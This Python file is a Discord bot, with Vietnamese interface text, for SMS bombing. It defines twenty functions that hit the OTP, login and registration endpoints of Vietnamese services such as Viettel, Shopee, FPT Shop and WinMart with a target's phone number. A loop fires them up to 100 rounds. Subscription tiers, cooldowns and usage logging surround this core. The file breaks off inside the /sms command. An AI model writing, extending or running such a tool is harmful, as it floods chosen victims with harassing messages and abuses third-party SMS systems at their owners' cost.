#Shin Vipro
import discord
from discord import app_commands
import asyncio
import aiohttp
import datetime
import time
import os
import sqlite3
import requests
import sys
import json
import random
import string
import logging
import psutil
from typing import Optional
import warnings
from urllib3.exceptions import InsecureRequestWarning

warnings.filterwarnings("ignore", category=DeprecationWarning) 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)

DISCORD_TOKEN = "dan token discord bot"

ADMIN_IDS = [1174711992225894474]

LOG_FILE = "logs.txt"
conn = sqlite3.connect('user_data.db')
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT,
        member_type TEXT
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS usage_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        command TEXT,
        details TEXT,
        timestamp TEXT,
        server_id INTEGER,
        server_name TEXT,
        channel_id INTEGER,
        channel_name TEXT
    )
''')
conn.commit()

print(f"✅ Đã kết nối database: user_data.db")

def log_command(user_id, username, command, details, interaction):
    """Ghi lịch sử sử dụng lệnh vào database và file logs.txt"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    server_id = interaction.guild.id if interaction.guild else 0
    server_name = interaction.guild.name if interaction.guild else "DM"
    channel_id = interaction.channel.id if interaction.channel else 0
    
    if interaction.channel:
        if isinstance(interaction.channel, discord.DMChannel):
            channel_name = "DM"
        elif isinstance(interaction.channel, discord.GroupChannel):
            channel_name = "Group"
        else:
            channel_name = interaction.channel.name
    else:
        channel_name = "Unknown"
    
    cursor.execute('''
        INSERT INTO usage_history (user_id, username, command, details, timestamp, server_id, server_name, channel_id, channel_name)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, username, command, details, timestamp, server_id, server_name, channel_id, channel_name))
    conn.commit()
    
    log_entry = f"[{timestamp}] USER: {username} (ID: {user_id}) | CMD: {command} | DETAILS: {details} | SERVER: {server_name} | CHANNEL: {channel_name}\n"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(log_entry.strip())

def log_admin_action(admin_id, admin_name, action, details, interaction):
    """Ghi log hành động admin"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    server_name = interaction.guild.name if interaction.guild else "DM"
    
    if interaction.channel:
        if isinstance(interaction.channel, discord.DMChannel):
            channel_name = "DM"
        elif isinstance(interaction.channel, discord.GroupChannel):
            channel_name = "Group"
        else:
            channel_name = interaction.channel.name
    else:
        channel_name = "Unknown"
    
    log_entry = f"[{timestamp}] 🔴 ADMIN: {admin_name} (ID: {admin_id}) | ACTION: {action} | DETAILS: {details} | SERVER: {server_name} | CHANNEL: {channel_name}\n"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(log_entry.strip())

def log_spam_result(user_id, username, phone, count, success, fail, total, duration):
    """Ghi log kết quả spam"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = f"[{timestamp}] 📱 SPAM | USER: {username} (ID: {user_id}) | PHONE: {phone} | COUNT: {count} | SUCCESS: {success} | FAIL: {fail} | TOTAL: {total} | TIME: {duration}s\n"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(log_entry.strip())

def log_weather(user_id, username, city, result, channel_name):
    """Ghi log tra cứu thời tiết"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = f"[{timestamp}] 🌤️ WEATHER | USER: {username} (ID: {user_id}) | CITY: {city} | RESULT: {result} | CHANNEL: {channel_name}\n"
    
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry)
    
    print(log_entry.strip())


otp_functions = []

def generate_random_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def send_otp_via_sapo(sdt):
    try:
        cookies = {
            'landing_page': 'https://www.sapo.vn/',
            'start_time': '07/30/2024 16:21:32',
            'lang': 'vi',
            'G_ENABLED_IDPS': 'google',
            'source': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
            'referral': 'https://accounts.sapo.vn/',
            'pageview': '7'
        }
        headers = {
            'accept': '*/*',
            'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.sapo.vn',
            'referer': 'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        data = {'phonenumber': sdt}
        response = requests.post('https://www.sapo.vn/fnb/sendotp', 
                               cookies=cookies, headers=headers, data=data, timeout=5)
        return True
    except:
        return False

def send_otp_via_viettel(sdt):
    try:
        cookies = {
            'laravel_session': 'ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf',
            'redirectLogin': 'https://viettel.vn/myviettel'
        }
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://viettel.vn',
            'Referer': 'https://viettel.vn/myviettel',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {
            'phone': sdt,
            'typeCode': 'DI_DONG',
            'actionCode': 'myviettel://login_mobile',
            'type': 'otp_login'
        }
        response = requests.post('https://viettel.vn/api/getOTPLoginCommon', 
                               cookies=cookies, headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_medicare(sdt):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://medicare.vn',
            'Referer': 'https://medicare.vn/login',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'mobile': sdt, 'mobile_country_prefix': '84'}
        response = requests.post('https://medicare.vn/api/otp', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_tv360(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://tv360.vn',
            'referer': 'https://tv360.vn/login',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'msisdn': sdt}
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_dienmayxanh(sdt):
    try:
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.dienmayxanh.com',
            'Referer': 'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        response = requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', 
                               headers=headers, data=data, verify=False, timeout=5)
        return True
    except:
        return False

def send_otp_via_shopee(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://shopee.vn',
            'referer': 'https://shopee.vn/buyer/signup',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {
            'operation': 8,
            'phone': sdt,
            'supported_channels': [1, 2, 3, 6, 0, 5],
            'support_session': True
        }
        response = requests.post('https://shopee.vn/api/v4/otp/get_settings_v2', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_TGDD(sdt):
    try:
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.thegioididong.com',
            'Referer': 'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        response = requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', 
                               headers=headers, data=data, timeout=5)
        return True
    except:
        return False

def send_otp_via_fptshop(sdt):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://fptshop.com.vn',
            'referer': 'https://fptshop.com.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': sdt}
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_longchau(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://nhathuoclongchau.com.vn',
            'referer': 'https://nhathuoclongchau.com.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'phoneNumber': sdt, 'otpType': 0, 'fromSys': 'WEBKHLC'}
        response = requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_F88(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://f88.vn',
            'referer': 'https://f88.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {
            'FullName': 'Nguyễn Văn A',
            'Phone': sdt,
            'DistrictCode': '024',
            'ProvinceCode': '02',
            'AssetType': 'Car',
            'IsChoose': '1',
            'ShopCode': '',
            'Url': 'https://f88.vn/lp/vay-theo-luong-thu-nhap-cong-nhan',
            'FormType': 1
        }
        response = requests.post('https://api.f88.vn/growth/webf88vn/api/v1/Pawn', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_ViettelMoney(sdt):
    try:
        url = 'https://api8.viettelpay.vn/customer/v2/accounts/register'
        payload = json.dumps({'identityType': 'msisdn', 'identityValue': sdt, 'type': 'REGISTER'})
        headers = {
            'User-Agent': 'Viettel Money/8.8.8',
            'Content-Type': 'application/json',
            'app-version': '8.8.8',
            'product': 'VIETTELPAY',
            'type-os': 'ios',
            'accept-language': 'vi'
        }
        response = requests.post(url, data=payload, headers=headers, timeout=5)
        return True
    except:
        return False

def send_otp_via_winmart(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'authorization': 'Bearer undefined',
            'content-type': 'application/json',
            'origin': 'https://winmart.vn',
            'referer': 'https://winmart.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-api-merchant': 'WCM'
        }
        json_data = {
            'firstName': 'Nguyễn Văn A',
            'phoneNumber': sdt,
            'masanReferralCode': '',
            'dobDate': '2000-01-01',
            'gender': 'Male'
        }
        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_mocha(sdt):
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://video.mocha.com.vn',
            'Referer': 'https://video.mocha.com.vn/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        params = {'msisdn': sdt, 'languageCode': 'vi'}
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', 
                               params=params, headers=headers, timeout=5)
        return True
    except:
        return False

def send_otp_via_lozi(sdt):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://lozi.vn',
            'referer': 'https://lozi.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'countryCode': '84', 'phoneNumber': sdt}
        response = requests.post('https://mocha.lozi.vn/v1/invites/use-app', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_ghn(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://sso.ghn.vn',
            'referer': 'https://sso.ghn.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'phone': sdt, 'type': 'register'}
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_lottemart(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.lottemart.vn',
            'referer': 'https://www.lottemart.vn/signup',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'username': sdt, 'case': 'register'}
        response = requests.post('https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_vietloan(sdt):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://vietloan.vn',
            'referer': 'https://vietloan.vn/register',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        data = {'phone': sdt, '_token': 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi'}
        response = requests.post('https://vietloan.vn/register/phone-resend', 
                               headers=headers, data=data, timeout=5)
        return True
    except:
        return False

def send_otp_via_fptplay(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://fptplay.vn',
            'referer': 'https://fptplay.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-did': 'A0EB7FD5EA287DBF'
        }
        json_data = {'phone': sdt, 'country_code': 'VN', 'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8'}
        response = requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_vieon(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://vieon.vn',
            'referer': 'https://vieon.vn/auth/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        params = {'platform': 'web', 'ui': '012021'}
        json_data = {
            'username': sdt,
            'country_code': 'VN',
            'model': 'Windows 10',
            'device_id': 'f812a55d1d5ee2b87a927833df2608bc',
            'device_name': 'Edge/127',
            'device_type': 'desktop',
            'platform': 'web',
            'ui': '012021'
        }
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', 
                               params=params, headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

def send_otp_via_ahamove(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://app.ahamove.com',
            'referer': 'https://app.ahamove.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'mobile': sdt, 'country_code': 'VN', 'firebase_sms_auth': True}
        response = requests.post('https://api.ahamove.com/api/v3/public/user/login', 
                               headers=headers, json=json_data, timeout=5)
        return True
    except:
        return False

otp_functions = [
    send_otp_via_sapo,
    send_otp_via_viettel,
    send_otp_via_medicare,
    send_otp_via_tv360,
    send_otp_via_dienmayxanh,
    send_otp_via_shopee,
    send_otp_via_TGDD,
    send_otp_via_fptshop,
    send_otp_via_longchau,
    send_otp_via_F88,
    send_otp_via_ViettelMoney,
    send_otp_via_winmart,
    send_otp_via_mocha,
    send_otp_via_lozi,
    send_otp_via_ghn,
    send_otp_via_lottemart,
    send_otp_via_vietloan,
    send_otp_via_fptplay,
    send_otp_via_vieon,
    send_otp_via_ahamove,
]

print(f"✅ Đã load {len(otp_functions)} API spam SMS")
print(f"📝 Log file: {LOG_FILE}")


class SpamSMSBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.start_time = time.time()
        self.active_spam = False
        self.current_user_id = None
        self.cooldown_dict = {}
        self.is_bot_active = True
        self.banned_numbers = ["0392499570", "0325708289"]  
        
    async def setup_hook(self):
        await self.tree.sync()
        logging.info("✅ Đã sync commands!")

bot = SpamSMSBot()


def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_timestamp():
    return str(datetime.date.today())

def get_elapsed_time():
    elapsed = time.time() - bot.start_time
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    seconds = int(elapsed % 60)
    return f"{hours}h {minutes}m {seconds}s"


def check_vip(user_id):
    cursor.execute('SELECT expiration_time FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    if result:
        try:
            expiration = datetime.datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
            if expiration > datetime.datetime.now():
                return True
        except:
            pass
    return False

def save_user(user_id, expiration_time, member_type):
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time, member_type)
        VALUES (?, ?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S'), member_type))
    conn.commit()

def remove_user(user_id):
    cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
    conn.commit()


async def run_spam(interaction, phone, count, is_vip=False):
    """Chạy spam SMS sử dụng các API đã tích hợp"""
    
    success_count = 0
    fail_count = 0
    start_time = time.time()
    
    await interaction.edit_original_response(
        content=f"📱 **ĐANG SPAM {'VIP ' if is_vip else ''}**\n"
                f"📞 SĐT: `{phone}`\n"
                f"🔄 Lượt: `0/{count}`\n"
                f"📊 Dịch vụ: `{len(otp_functions)}`\n"
                f"⏱️ Đang chạy..."
    )
    
    for round_num in range(1, count + 1):
        if not bot.active_spam or bot.current_user_id != interaction.user.id:
            break
        
        elapsed = int(time.time() - start_time)
        await interaction.edit_original_response(
            content=f"📱 **ĐANG SPAM {'VIP ' if is_vip else ''}**\n"
                    f"📞 SĐT: `{phone}`\n"
                    f"🔄 Lượt: `{round_num}/{count}`\n"
                    f"✅ Thành công: `{success_count}`\n"
                    f"❌ Thất bại: `{fail_count}`\n"
                    f"⏱️ Đã chạy: `{elapsed}s`"
        )
        
        for func in otp_functions:
            if not bot.active_spam or bot.current_user_id != interaction.user.id:
                break
            
            try:
                loop = asyncio.get_event_loop()
                result = await loop.run_in_executor(None, func, phone)
                if result:
                    success_count += 1
                else:
                    fail_count += 1
            except:
                fail_count += 1
            
            
            await asyncio.sleep(random.uniform(0.2, 0.5))
    
    elapsed = int(time.time() - start_time)
    total_requests = len(otp_functions) * (round_num-1)
    
    embed = discord.Embed(
        title="✅ SPAM HOÀN TẤT" if bot.active_spam else "⏹️ ĐÃ DỪNG SPAM",
        color=discord.Color.green() if bot.active_spam else discord.Color.orange()
    )
    embed.add_field(name="📞 SĐT", value=f"`{phone}`", inline=True)
    embed.add_field(name="✅ Thành công", value=f"`{success_count}`", inline=True)
    embed.add_field(name="❌ Thất bại", value=f"`{fail_count}`", inline=True)
    embed.add_field(name="📊 Tổng request", value=f"`{total_requests}`", inline=True)
    embed.add_field(name="⏱️ Thời gian", value=f"`{elapsed}s`", inline=True)
    embed.add_field(name="🔄 Lượt", value=f"`{round_num-1}/{count}`", inline=True)
    
    await interaction.edit_original_response(content=None, embed=embed)
    

    log_spam_result(
        interaction.user.id,
        interaction.user.name,
        phone,
        count,
        success_count,
        fail_count,
        total_requests,
        elapsed
    )
    

    bot.active_spam = False
    bot.current_user_id = None


@bot.tree.command(name="help", description="Hiển thị danh sách lệnh")
async def help_command(interaction: discord.Interaction):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    log_command(interaction.user.id, interaction.user.name, "/help", "Xem danh sách lệnh", interaction)
    
    embed = discord.Embed(
        title="📋 DANH SÁCH LỆNH",
        description=f"**Tổng số API spam:** `{len(otp_functions)}` dịch vụ",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="🔧 LỆNH CƠ BẢN",
        value="`/help` - Hiển thị danh sách lệnh\n"
              "`/ping` - Kiểm tra độ trễ bot\n"
              "`/uptime` - Xem thời gian hoạt động\n"
              "`/id` - Xem ID của bạn\n"
              "`/status` - Xem trạng thái bot\n"
              "`/logs` - Xem lịch sử sử dụng (Admin only)",
        inline=False
    )
    
    embed.add_field(
        name="📱 LỆNH SPAM SMS",
        value="`/sms <số điện thoại> <số lần>` - Spam SMS (1-100 lần)\n"
              "`/spamvip <số điện thoại> <số lần>` - Spam VIP (1-100 lần)\n"
              "`/stopspam` - Dừng spam đang chạy\n"
              "`/services` - Xem danh sách dịch vụ",
        inline=False
    )
    
    embed.add_field(
        name="🌤️ LỆNH THỜI TIẾT",
        value="`/weather <thành phố>` - Xem thông tin thời tiết",
        inline=False
    )
    
    if is_admin(interaction.user.id):
        embed.add_field(
            name="👑 LỆNH ADMIN",
            value="`/on` - Bật bot\n"
                  "`/off` - Tắt bot\n"
                  "`/addvip <user> <ngày>` - Thêm VIP\n"
                  "`/removevip <user>` - Xóa VIP\n"
                  "`/profile [user]` - Xem thông tin user\n"
                  "`/cpu` - Xem thông tin CPU\n"
                  "`/logs` - Xem lịch sử sử dụng",
            inline=False
        )
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="logs", description="Xem lịch sử sử dụng bot (Admin only)")
@app_commands.describe(
    limit="Số lượng log muốn xem (mặc định 20)",
    user="Xem log của user cụ thể (không bắt buộc)"
)
async def logs_command(interaction: discord.Interaction, limit: Optional[int] = 20, user: Optional[discord.User] = None):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bạn không có quyền sử dụng lệnh này!", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    if limit > 100:
        limit = 100
    

    if user:
        cursor.execute('''
            SELECT timestamp, username, command, details, server_name, channel_name 
            FROM usage_history 
            WHERE user_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ?
        ''', (user.id, limit))
        title = f"📜 LỊCH SỬ SỬ DỤNG CỦA {user.name}"
    else:
        cursor.execute('''
            SELECT timestamp, username, command, details, server_name, channel_name 
            FROM usage_history 
            ORDER BY timestamp DESC 
            LIMIT ?
        ''', (limit,))
        title = f"📜 LỊCH SỬ SỬ DỤNG ({limit} gần nhất)"
    
    rows = cursor.fetchall()
    
    if not rows:
        await interaction.followup.send("📭 **Không có lịch sử sử dụng!**")
        return
    

    embed = discord.Embed(
        title=title,
        color=discord.Color.blue()
    )
    
    log_text = ""
    for i, row in enumerate(rows, 1):
        timestamp, username, cmd, details, server, channel = row
        log_text += f"**{i}.** [{timestamp}] **{username}** | `{cmd}` | {details[:50]}... | #{channel}\n"
        

        if len(log_text) > 1000:
            embed.description = log_text
            await interaction.followup.send(embed=embed)
            log_text = ""
            embed = discord.Embed(color=discord.Color.blue())
    
    if log_text:
        embed.description = log_text
        await interaction.followup.send(embed=embed)
    
    log_command(interaction.user.id, interaction.user.name, "/logs", f"Xem {limit} logs", interaction)

@bot.tree.command(name="services", description="Xem danh sách dịch vụ spam")
async def services_command(interaction: discord.Interaction):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    log_command(interaction.user.id, interaction.user.name, "/services", "Xem danh sách dịch vụ", interaction)
    
    service_names = [
        "1. Sapo", "2. Viettel", "3. Medicare", "4. TV360", "5. Điện Máy Xanh",
        "6. Shopee", "7. Thế Giới Di Động", "8. FPT Shop", "9. Long Châu", "10. F88",
        "11. Viettel Money", "12. WinMart", "13. Mocha", "14. Lozi", "15. GHN",
        "16. Lotte Mart", "17. Vietloan", "18. FPT Play", "19. VieON", "20. Ahamove"
    ]
    

    chunks = [service_names[i:i+10] for i in range(0, len(service_names), 10)]
    
    class ServiceView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=60)
            self.current_page = 0
            self.chunks = chunks
        
        async def update_message(self, interaction):
            embed = discord.Embed(
                title=f"📋 DANH SÁCH DỊCH VỤ (Trang {self.current_page + 1}/{len(self.chunks)})",
                description="\n".join(self.chunks[self.current_page]),
                color=discord.Color.blue()
            )
            embed.set_footer(text=f"Tổng số: {len(otp_functions)} dịch vụ")
            await interaction.response.edit_message(embed=embed, view=self)
        
        @discord.ui.button(label="◀️", style=discord.ButtonStyle.secondary)
        async def previous_button(self, interaction: discord.Interaction, button: discord.ui.Button):
            if self.current_page > 0:
                self.current_page -= 1
                await self.update_message(interaction)
        
        @discord.ui.button(label="▶️", style=discord.ButtonStyle.secondary)
        async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
            if self.current_page < len(self.chunks) - 1:
                self.current_page += 1
                await self.update_message(interaction)
    
    embed = discord.Embed(
        title="📋 DANH SÁCH DỊCH VỤ (Trang 1/{})".format(len(chunks)),
        description="\n".join(chunks[0]),
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"Tổng số: {len(otp_functions)} dịch vụ")
    
    await interaction.response.send_message(embed=embed, view=ServiceView())

@bot.tree.command(name="ping", description="Kiểm tra độ trễ của bot")
async def ping_command(interaction: discord.Interaction):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    latency = round(bot.latency * 1000)
    log_command(interaction.user.id, interaction.user.name, "/ping", f"Độ trễ: {latency}ms", interaction)
    await interaction.response.send_message(f"🏓 **Pong!** Độ trễ: `{latency}ms`")

@bot.tree.command(name="uptime", description="Xem thời gian bot đã hoạt động")
async def uptime_command(interaction: discord.Interaction):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    uptime = get_elapsed_time()
    log_command(interaction.user.id, interaction.user.name, "/uptime", f"Uptime: {uptime}", interaction)
    await interaction.response.send_message(f"⏱️ **Bot đã hoạt động:** `{uptime}`")

@bot.tree.command(name="id", description="Xem ID Discord của bạn")
async def id_command(interaction: discord.Interaction):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    log_command(interaction.user.id, interaction.user.name, "/id", f"ID: {interaction.user.id}", interaction)
    await interaction.response.send_message(f"🆔 **ID của bạn:** `{interaction.user.id}`")

@bot.tree.command(name="status", description="Xem trạng thái bot")
async def status_command(interaction: discord.Interaction):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    status = "🟢 **Đang hoạt động**" if bot.is_bot_active else "🔴 **Đã tắt**"
    uptime = get_elapsed_time()
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory().percent
    

    today = datetime.datetime.now().strftime("%Y-%m-%d")
    cursor.execute('''
        SELECT COUNT(*) FROM usage_history 
        WHERE date(timestamp) = date('now')
    ''')
    today_usage = cursor.fetchone()[0]
    
    embed = discord.Embed(
        title="📊 TRẠNG THÁI BOT",
        color=discord.Color.green() if bot.is_bot_active else discord.Color.red()
    )
    embed.add_field(name="Trạng thái", value=status, inline=True)
    embed.add_field(name="⏱️ Uptime", value=uptime, inline=True)
    embed.add_field(name="📊 CPU", value=f"`{cpu}%`", inline=True)
    embed.add_field(name="💾 RAM", value=f"`{memory}%`", inline=True)
    embed.add_field(name="📈 Ping", value=f"`{round(bot.latency * 1000)}ms`", inline=True)
    embed.add_field(name="📱 API Spam", value=f"`{len(otp_functions)}`", inline=True)
    embed.add_field(name="📊 Dùng hôm nay", value=f"`{today_usage}` lần", inline=True)
    
    log_command(interaction.user.id, interaction.user.name, "/status", "Xem trạng thái bot", interaction)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="sms", description="Spam SMS đến số điện thoại")
@app_commands.describe(
    phone="Số điện thoại cần spam (10 số)",
    count="Số lần spam (1-100)"
)
async def sms_command(interaction: discord.Interaction, phone: str, count: int):
    if not bot.is_bot_active:
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
 
    if not phone.isdigit() or len(phone) != 10:
        await interaction.response.send_message("❌ Số điện thoại không hợp lệ! Vui lòng nhập 10 số.", ephemeral=True)
        return
    

    if count < 1 or count > 100:
        await interaction.response.send_message("❌ Số lần spam phải từ 1 đến 100!", ephemeral=True)
        return

    if phone in bot.banned_numbers:
        await interaction.response.send_message("❌ Số điện thoại này đã bị cấm spam!", ephemeral=True)
        return
    

    user_id = interaction.user.id
    current_time = time.time()
    if user_id in bot.cooldown_dict and current_time - bot.cooldown_dict.get(user_id, 0) < 120:
        remaining = int(120 - (current_time - bot.cooldown_dict[user_id]))
        await interaction.response.send_message(f"⏳ Vui lòng chờ `{remaining}` giây trước khi dùng lại!", ephemeral=True)
        return
    

    if bot.active_spam:
        await interaction.response.send_message("❌ Đang có spam chạy! Dùng `/stopspam` để dừng.", ephemeral=True)
        return
    
    bot.cooldown_dict[user_id] = current_time
